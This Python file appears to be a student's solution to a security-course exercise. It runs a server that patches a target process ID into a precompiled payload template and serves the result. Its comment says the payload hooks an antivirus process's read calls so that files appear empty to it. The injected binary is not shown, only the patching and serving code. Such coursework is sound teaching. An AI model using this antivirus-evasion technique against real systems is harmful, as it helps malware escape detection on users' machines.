import assemble
import server
import struct

TEMPLATE_PATH = "./q4.template"
ANTI_PID_HOLDER = 0x12345678

class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):
        # Return a payload that will intercept all calls to read (for all files)
        # with calls that read a length of 0 (to make files appear empty).
        # 1. You can assume we already compiled q4.c into q4.template.
        with open(TEMPLATE_PATH, 'rb') as reader:
            payload_template = reader.read()
        
        # convert the address to bytes before lookup
        anti_pid_holder_bytes = struct.pack('<L', ANTI_PID_HOLDER)

        # find and replace with the real value in the .text segment of the template binary
        pid_addr = payload_template.find(anti_pid_holder_bytes)

        payload = payload_template
        payload = payload[:pid_addr] + struct.pack("<L", pid) + payload[pid_addr+4:]

        return payload

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

